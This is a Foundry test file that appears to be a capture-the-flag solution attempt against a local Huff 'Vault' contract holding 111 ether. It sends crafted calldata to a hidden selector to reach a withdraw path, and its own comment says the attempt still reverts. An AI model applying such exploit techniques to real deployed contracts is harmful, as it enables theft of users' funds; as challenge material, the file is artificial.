// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";

interface Vault {
    function setOwner(address) external returns (bool);
    function deposit() external;
    function withdraw() external;
}

contract SolutionTest is Test {
    Vault public vault;

    address constant hacker = payable(address(0xbadbabe));

    function setUp() public {
        vault = Vault(HuffDeployer.config().with_value(111 ether).deploy{value: 111 ether}("Vault"));
        vm.deal(hacker, 0.2 ether); // give the hacker a little beer money
    }

    function testHack() public {
        // Try sending 0x69696969 as first 4 bytes to trigger to get into NOT_A_RUG_PULL()
        // and then send 0x46 as the calldata so that it will get past the loop
        bytes memory payload = abi.encodeWithSelector(bytes4(0x69696969), 0x46);
        vm.startPrank(hacker);
        (bool success, bytes memory returnData) = address(vault).call{value: 0.001 ether}(payload);
        require(success);
        // After the "come and take it" WITHDRAW() line, there is no return or JUMP so it continues to execute
        // down to the not_valid JUMPDEST and then reverts on the next line.  So close!!
    }

}

